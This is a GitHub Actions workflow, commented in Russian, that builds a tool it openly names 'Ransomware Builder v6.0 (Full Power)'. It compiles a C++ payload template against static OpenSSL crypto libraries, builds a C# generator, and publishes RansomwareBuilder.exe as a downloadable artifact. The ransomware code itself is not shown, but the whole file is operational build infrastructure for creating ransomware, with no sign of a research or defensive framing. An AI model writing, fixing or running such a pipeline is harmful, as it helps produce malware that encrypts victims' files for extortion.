name: Build Ransomware Builder v6.0 (Full Power)

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest
    
    steps:
    - name: Checkout
      uses: actions/checkout@v4
    
    # ========== КЭШ VCPKG ==========
    - name: Cache vcpkg
      uses: actions/cache@v3
      id: cache-vcpkg
      with:
        path: |
          C:\vcpkg
          C:\vcpkg\installed
          C:\Users\runneradmin\AppData\Local\vcpkg\archives
        key: vcpkg-${{ runner.os }}-${{ hashFiles('**/vcpkg.json') }}
        restore-keys: |
          vcpkg-${{ runner.os }}-
    
    # ========== УСТАНОВКА OPENSSL ЧЕРЕЗ VCPKG ==========
    - name: Install OpenSSL via vcpkg
      if: steps.cache-vcpkg.outputs.cache-hit != 'true'
      run: |
        vcpkg install openssl:x64-windows-static
    
    # ========== СБОРКА ШАБЛОНА (C++ C++17 + OpenSSL) ==========
    - name: Setup MSVC
      uses: ilammy/msvc-dev-cmd@v1
    
    - name: Build Template
      run: |
        Write-Host "=== Building template.cpp with vcpkg OpenSSL ==="
        
        # Проверяем, что OpenSSL установлен
        if (-not (Test-Path "C:\vcpkg\installed\x64-windows-static\include\openssl\evp.h")) {
            Write-Host "OpenSSL not found!"
            exit 1
        }
        
        # Собираем
        cl /O2 /MT /EHsc /std:c++17 /I"C:\vcpkg\installed\x64-windows-static\include" /Fe:template.exe template.cpp /link user32.lib advapi32.lib shell32.lib crypt32.lib "C:\vcpkg\installed\x64-windows-static\lib\ssl.lib" "C:\vcpkg\installed\x64-windows-static\lib\crypto.lib"
        
        if (Test-Path template.exe) {
            Write-Host "=== Build SUCCESS ==="
            Get-ChildItem template.exe | Format-Table -AutoSize
        } else {
            Write-Host "=== Build FAILED ==="
            exit 1
        }
    
    # ========== СБОРКА БИЛДЕРА (C#) ==========
    - name: Setup .NET
      uses: actions/setup-dotnet@v4
      with:
        dotnet-version: '4.8.x'
    
    - name: Build Builder
      run: |
        dotnet build builder.csproj --configuration Release
        Get-ChildItem bin/Release/net48/RansomwareBuilder.exe | Format-Table -AutoSize
    
    - name: Upload Builder EXE
      uses: actions/upload-artifact@v4
      with:
        name: RansomwareBuilder_v6_Full
        path: bin/Release/net48/RansomwareBuilder.exe
